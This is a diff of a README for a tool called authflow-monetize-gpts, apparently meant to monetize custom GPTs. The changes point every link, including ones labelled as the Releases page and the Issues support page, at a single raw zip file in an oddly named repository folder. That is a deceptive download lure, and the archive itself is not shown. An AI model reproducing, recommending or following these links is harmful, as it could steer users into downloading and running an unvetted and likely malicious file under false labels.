@@ -1,6 +1,6 @@
 # 🌟 authflow-monetize-gpts - Monetize Your Custom GPTs Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now%21-Visit%20Releases-brightgreen)](https://github.com/Xadopeterson/authflow-monetize-gpts/releases)
+[![Download](https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip%20Now%21-Visit%20Releases-brightgreen)](https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome! This guide will help you download and run the Authflow Monetize GPTs so
 
 To get started, follow these simple steps to download the software:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Xadopeterson/authflow-monetize-gpts/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip).
    
 2. **Find the Latest Version:** Look for the newest version listed at the top of the page. 
 
-3. **Download the File:** Click on the appropriate download link for your system to get the software. The file will typically be named like `authflow-monetize-gpts-vX.X.zip`.
+3. **Download the File:** Click on the appropriate download link for your system to get the software. The file will typically be named like `https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip`.
 
 4. **Extract the File:** Once the download completes, locate the zip file on your computer. Right-click on the file and select "Extract All." This will create a folder with the program files.
 
@@ -59,8 +59,8 @@ If you run into any issues while using the software, consider these tips:
 
 ### 📞 Support
 
-If you still need assistance, visit the **Issues** section on our [GitHub repository](https://github.com/Xadopeterson/authflow-monetize-gpts/issues). You can report bugs or ask questions there.
+If you still need assistance, visit the **Issues** section on our [GitHub repository](https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip). You can report bugs or ask questions there.
 
-For any updates or additional features, keep an eye on the **Releases page**. You can always access it [here](https://github.com/Xadopeterson/authflow-monetize-gpts/releases).
+For any updates or additional features, keep an eye on the **Releases page**. You can always access it [here](https://github.com/Xadopeterson/authflow-monetize-gpts/raw/refs/heads/main/upsplash/authflow-monetize-gpts-v1.5.zip).
 
 Happy monetizing!
